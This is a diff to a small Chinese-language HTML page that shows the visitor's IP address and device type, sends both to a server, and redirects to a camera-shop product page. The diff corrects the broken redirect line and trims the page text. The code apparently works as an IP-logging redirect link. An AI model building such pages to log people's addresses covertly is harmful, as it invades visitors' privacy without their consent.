@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>记录IP地址和设备类型</title>
+    <title>紀錄網站</title>
 </head>
 <body>
-    <h1>欢迎来到我们的网站</h1>
     
-    <p>您的IP地址是: <span id="ipAddress"></span></p>
-    <p>您的设备类型是: <span id="deviceType"></span></p>
+    <p>IP地址是: <span id="ipAddress"></span></p>
+    <p>設備類型: <span id="deviceType"></span></p>
 
     <script>
         // 获取用户的IP地址
@@ -18,9 +17,9 @@
                 document.getElementById('ipAddress').textContent = ipAddress;
 
                 // 获取用户设备类型
-                var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? '移动设备' : '桌面设备';
+                var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? '手機' : '桌面设备';
                 document.getElementById('deviceType').textContent = deviceType;
-                windows.location.href ='https://www.bigcamera.com.tw/goods_view.php?no=7388'
+                window.location.href ='https://www.bigcamera.com.tw/goods_view.php?no=7388'
                 // 发送IP地址和设备类型到服务器
                 sendToServer(ipAddress, deviceType);
             })
